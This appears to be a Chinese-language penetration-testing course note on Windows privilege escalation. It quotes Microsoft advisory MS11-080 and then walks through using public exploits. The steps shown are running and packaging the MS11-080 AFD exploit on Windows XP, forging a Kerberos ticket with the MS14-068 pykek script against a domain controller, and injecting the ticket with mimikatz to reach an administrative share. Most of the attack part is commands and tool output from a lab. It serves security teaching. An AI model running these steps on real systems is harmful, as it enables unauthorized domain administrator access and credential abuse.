@@ -1,0 +1,265 @@
+课时47 利用漏洞提权
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃利用漏洞提权                                                          ┃
+┃Ms11-080                                                              ┃
+┃Kb2592799                                                             ┃
+┃    https://technet.microsoft.com/library/security/ms11-080           ┃
+┃Pyinstaller                                                           ┃
+┃    https://pypi.python.org/pypi/PyInstaller/2.1                      ┃
+┃python pyinstaller --onefile ms11-080.py                              ┃
+┃Pywin32                                                               ┃
+┃    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/┃
+┃MS11-046                                                              ┃
+┃    DoS                                                               ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+ Microsoft 安全公告 MS11-080 - 重要
+此主题尚未评级 - 评价此主题
+辅助功能驱动程序中的漏洞可能允许特权提升 (2592799)
+
+发布时间: 2011年10月11日
+
+版本: 1.0
+一般信息
+摘要
+
+此安全更新可解决 Microsoft Windows Ancillary Function Driver (AFD) 中一个秘密报告的漏洞。如果攻击者登录用户的系统，并运行特制应用程序，则此漏洞可能允许提升特权。攻击者必须拥有有效的登录凭据，并能够本地登录才能利用此漏洞。
+
+对于 Windows XP 和 Windows Server 2003 的所有受支持版本，此安全更新等级为“重要”。有关详细信息，请参阅本节中“受影响和不受影响的软件”小节。
+
+此安全更新通过更正辅助功能驱动程序 (AFD) 在将输入从用户模式传递到 Windows 内核之前验证输入的方式来解决漏洞。有关漏洞的详细信息，请参阅下一节“漏洞信息”下面特定漏洞条目的常见问题 (FAQ) 小节。
+
+建议。 大多数客户均启用了“自动更新”，他们不必采取任何操作，因为此安全更新将自动下载并安装。尚未启用“自动更新”的客户必须检查更新，并手动安装此更新。有关自动更新中特定配置选项的信息，请参阅 Microsoft 知识库文章 294871。
+
+对于管理员、企业安装或者想要手动安装此安全更新的最终用户，Microsoft 建议客户使用更新管理软件尽早应用此更新或者利用 Microsoft Update 服务检查更新。
+
+另请参阅本公告后面部分中的“检测和部署工具及指导”一节。
+
+已知问题。 无
+受影响和不受影响的软件
+
+已对下列软件进行测试，以确定受到影响的版本。其他版本的支持生命周期已结束或者不受影响。要确定软件版本的技术支持生命周期，请访问 Microsoft 技术支持生命周期。
+
+受影响的软件
+操作系统	最大安全影响	综合严重等级	此更新替代的公告
+Windows XP Service Pack 3 	特权提升	重要	MS11-046
+Windows XP Professional x64 Edition Service Pack 2 	特权提升	重要	MS11-046
+Windows Server 2003 Service Pack 2 	特权提升	重要	MS11-046
+Windows Server 2003 x64 Edition Service Pack 2 	特权提升	重要	MS11-046
+Windows Server 2003 SP2（用于基于 Itanium 的系统） 	特权提升	重要	MS11-046
+
+不受影响的软件
+操作系统
+Windows Vista Service Pack 2
+Windows Vista x64 Edition Service Pack 2
+Windows Server 2008（用于 32 位系统）Service Pack 2
+Windows Server 2008（用于基于 x64 的系统）Service Pack 2
+Windows Server 2008（用于基于 Itanium 的系统）Service Pack 2
+Windows 7（用于 32 位系统）和 Windows 7（用于 32 位系统）Service Pack 1
+Windows 7（用于基于 x64 的系统）和 Windows 7（用于基于 x64 的系统）Service Pack 1
+Windows Server 2008 R2（用于基于 x64 的系统）和 Windows Server 2008 R2（用于基于 x64 的系统）Service Pack 1
+Windows Server 2008 R2（用于基于 Itanium 的系统）和 Windows Server 2008 R2（用于基于 Itanium 的系统）Service Pack 1
+与此安全更新相关的常见问题 (FAQ)
+
+在哪里可以找到文件信息详细资料？
+有关文件信息详细资料的位置，请参阅“安全更新部署”部分中的参考表。
+
+我正在使用本安全公告中讨论的软件的较旧版本。我该怎么办？
+已对本公告中列出的受影响的软件进行测试，以确定受到影响的版本。其他版本的支持生命周期已结束。有关产品生命周期的详细信息，请访问 Microsoft 产品技术支持生命周期网站。
+
+使用该软件的较旧版本的客户应优先考虑迁移到受支持的版本，以防止可能会受到新出现漏洞的影响。要确定您的软件版本的技术支持生命周期，请参阅选择一项产品以获取生命周期信息。有关这些软件版本的 Service Pack 的详细信息，请参阅生命周期支持的 Service Pack。
+
+如果用户需要获得较旧软件的定制支持，则必须与其 Microsoft 客服小组代表、其技术客户经理或适当的 Microsoft 合作伙伴代表联系以了解定制支持选项。没有联合合同、优先支持合同或授权合同的客户可与其当地的 Microsoft 销售分支机构联系。有关联系信息，请访问 Microsoft Worldwide Information 网站，在联系信息列表中选择国家/地区，然后单击“Go”以查看电话号码列表。在拨打电话时，请找当地的“企业技术咨询支持服务”销售经理进行洽谈。有关详细信息，请参阅 Microsoft 技术支持生命周期策略常见问题。
+漏洞信息
+严重等级和漏洞标识符
+
+以下严重等级假设漏洞的可能的最大影响。有关此安全公告发布 30 天内，漏洞利用的安全等级和安全影响的可能性的信息，请参阅 10 月份公告摘要中的利用指数。有关详细信息，请参阅 Microsoft 利用指数。
+按受影响软件列出的漏洞严重等级和最大安全影响 受影响的软件	辅助功能驱动程序特权提升漏洞 - CVE-2011-2005	综合严重等级
+Windows XP Service Pack 3	重要
+特权提升	重要
+Windows XP Professional x64 Edition Service Pack 2	重要
+特权提升	重要
+Windows Server 2003 Service Pack 2	重要
+特权提升	重要
+Windows Server 2003 x64 Edition Service Pack 2	重要
+特权提升	重要
+Windows Server 2003 SP2（用于基于 Itanium 的系统）	重要
+特权提升	重要
+
+
+root@kali:~# searchsploit ms11-080
+--------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             |(/usr/share/exploitdb/platforms)
+--------------------------------------------- ----------------------------------
+Microsoft Windows XP/2003 Afd.yss - Local   
+Privilege Escalation Exploit (MS11-080)      | ./windows/local/18176/py
+Windows - AfdJoinLeaf Privilege Escalation 
+(MS11-080)                                   | ./windows/local/21844.rb
+--------------------------------------------- ----------------------------------
+
+root@kali:~# cp /usr/share/exploitdb/platforms.windows/local/18176.py
+
+中文版的XP
+C:\Docouments and Settings\yuanfh>cd
+
+C:>cd python27
+
+C:\python27> python.exe 18176.py -O XP          //直接蓝屏然后重启
+
+C:\Docouments and Settings\yuanfh>cd
+
+C:>cd python27\PyInstaller-2.1
+
+C:\python27\PyInstaller-2.1>..\python.exe python PyInstaller.py --onefile 18176.py
+
+英文版的XP
+
+C:>cd temp
+
+C:/temp>18176.exe -O XP
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃利用漏洞提权                                                  ┃
+┃Ms14-068                                                      ┃
+┃库                                                            ┃
+┃https://github.com/bidord/pykek                               ┃
+┃ms14-068.py -u user@lab.com -s userSID -d dc.lab.com          ┃
+┃拷贝 TGT_user1@lab.com.ccache 到windows系统                   ┃
+┃本地管理员登陆                                                ┃
+┃mimikatz.exe log "kerberos::ptc TGT_user@lab.com.ccache" exit ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\Docouments and Settings\yuanfh>cd
+
+C:>cd python27
+
+C:\python27>whoami.exe
+
+C:\python27>whoami.exe /all
+[User]     -"LAB\u1" S-1-5-21-1174131619-5100335615-3702386081-1107
+
+[Group  1] - "LAB\Domain Users" S-1-5-21-1174131619-510335615-3702386081-513
+[Group  2] - "Everyone" S-1-1-0
+[Group  3] - "BUILTIN\Users" S-1-5-32-545
+[Group  4] - "NT AUTHORITY\INTERACTIVE" S-1-5-4
+[Group  5] - "NT AUTHORITY\Authenticated Users" S-1-5-11
+[Group  6] - "Local" S-1-2-0
+
+
+<X> SeChangeNotifyPrivilege          -
+<O> SeShutdownPrivilege              -
+<X> SeUndockPrivilege                -
+<X> SeCreateGloalPrivilege           -
+
+root@kali:~# python 35474.py -u user@lab.com -s S-1-5-21-1174131619-510335615-3702386081-1107 -d 192.168.1.145
+Password:
+ [+] Building AS-REQ for 192.168.1.145... Done!
+ [+] Sending AS-REQ to 192.168.1.145... Done!
+ [+] Receiving AS-REP from 192.168.1.145... Done!
+ [+] Parsing AS-REP from 192.168.1.145... Done!
+ [+] Builing TGS-REQ for 192.168.1.145... Done!
+ [+] Sending TGS-REQ to 192.168.1.145... Done!
+ [+] Receiving TGS-REP from 192.168.1.145... Done!
+ [+] Parsing TGS-REP from 192.168.1.145... Done!
+ [+] Creating ccache file 'TGT_u1@ab.com.ccache' ...Done!
+
+root@kali:~# cp TGT_u1@ab.com.ccache /media/sf_D_DRIVE/
+
+C:\Docouments and Settings\y>cd
+
+C:>cd mimikatz
+
+C:\mimikatz> cd Win32
+
+C:\mimikatz\Win32>mimikatz
+
+C:\mimikatz\Win32>mimikatz.exe log "kerberos::ptc TGT_user@lab.com.ccache" exit
+
+win7
+C:\User\w7>cd\
+
+C:\>cd x64
+
+C:\x64>mimikatz.exe
+
+  .#####.    mimikat 2.0 alpha (x64) release "Kiwi en C" (Jun 14 2014 22:54:17)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY 'gentilkiwi' (benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz
+  '#####'                                    with  14 modules * * */
+
+mimikatz # kerberos::
+ERROR mimikatz_doLocal ; "(null)" command of "kerberos" module not found !
+
+Module :        kerberos
+Full name :     Kerberos package module
+Description :
+             ptt  -  Pass-the-ticket [NT 6]
+            list  -  List ticket(s)
+             tgt  -  Retrieve current TGT
+           purge  -  Purge ticket(s)
+          golden  -  Willy Wonka factory
+            hash  -  Hash password to keys
+             ptc  -  Pass-the-ccache [NT6]
+           clist  -  List tickets in MIT/Heimdall ccache
+
+mimikatz # kerberos::TGT_user@lab.com.ccache
+
+Principal : (01) : user1 : @LAB.COM
+
+Data 0
+          Start/End/MaxRenew: 2015/9/15 21:47:42 : 2015/9/16 7:47:42 :
+          Service Name (01) : krbtgt ; LAB.COM ; @LAB.COM
+          Target Name  (01) : krbtgt ; LAB.com ; @LAB.COM
+          Client Nmae  (01) : user1 : @LAB.COM
+          Flags 50a00000    : per_authent ; renewable ; proxiable ; forwerdaeble ;
+          Session Key       : 0x00000017 - rc4_hmac_nt
+            598a6399a9365cce3c5806f318490f50
+          Ticket            : 0x00000000 - null              ; kvno = 2        [...]
+          - injecting ticket : OK
+
+C:\User\w7>net use \\w2k3.lab\admin&
+The command completed successfully
+
+C:\User\w7>klist
+
+Current LogonId is 0:0x4a097
+
+Cached Tickets: (3)
+
+#0>     Client: user @ LAB.COM
+        Server: krbtgt/LAB.COM @ LAB.COM
+        KerbTicket Encryption Type: RSADST RC4-HMAC(NT)
+        Ticket Flags 0x60a00000 -> forwardable forwarded renewable pre_authent
+        Start Time: 9/15/2015 22:15:36 (local)
+        End Time:   9/16/2015 7L47:42 (local)
+        Renew Time: 9/22/2015 21:47:42 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+
+#1>     Client: user1 @ LAB.com
+        Server: krbtgt/LAB.COM @ LAB.COM
+        KerbTicket Encryption Type: RSADST RC4-HMAC(NT)
+        Ticket Flags 0x60a00000 -> forwardable proxiable renewable pre_authent
+        Start Time: 9/15/2015 22:15:36 (local)
+        End Time:   9/16/2015 7L47:42 (local)
+        Renew Time: 9/22/2015 21:47:42 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+
+#2>     Client: user1 @ LAB.com
+        Server: cifs/w2k3.lab.com @ LAB.COM
+        KerbTicket Encryption Type: RSADST RC4-HMAC(NT)
+        Ticket Flags 0x60a00000 -> forwardable proxiable renewable ok_as_deleg
+        Start Time: 9/15/2015 22:15:36 (local)
+        End Time:   9/16/2015 7L47:42 (local)
+        Renew Time: 9/22/2015 21:47:42 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+
+
+
+
+
+
+
+
